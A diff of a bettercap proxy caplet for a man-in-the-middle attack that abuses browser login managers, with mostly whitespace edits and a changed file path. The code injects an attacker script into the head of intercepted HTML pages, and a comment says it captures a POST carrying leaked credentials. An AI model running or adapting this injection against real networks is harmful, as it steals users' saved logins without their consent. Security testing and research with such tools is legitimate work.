@@ -1,5 +1,5 @@
 /*
- * Ref.
+ * Ref. 
  *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72
  *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/
  *
@@ -13,7 +13,7 @@ var AbuserJavascript = "";
 
 function onLoad() {
     // log( "Loading abuser code from login-man-abuser.js" );
-    AbuserJavascript = readFile("/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js")
+    AbuserJavascript = readFile("/usr/local/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js")
 }
 
 // here we intercept the ajax POST request with leaked credentials.
@@ -39,13 +39,13 @@ function onResponse(req, res) {
     if( res.ContentType.indexOf('text/html') == 0 ){
         var body = res.ReadBody();
         if( body.indexOf('</head>') != -1 ) {
-            res.Body = body.replace(
-                '</head>',
+            res.Body = body.replace( 
+                '</head>', 
                 '<script type="text/javascript">' + "\n" +
                     AbuserJavascript +
                 '</script>' +
                 '</head>'
-            );
+            ); 
         }
     }
 }
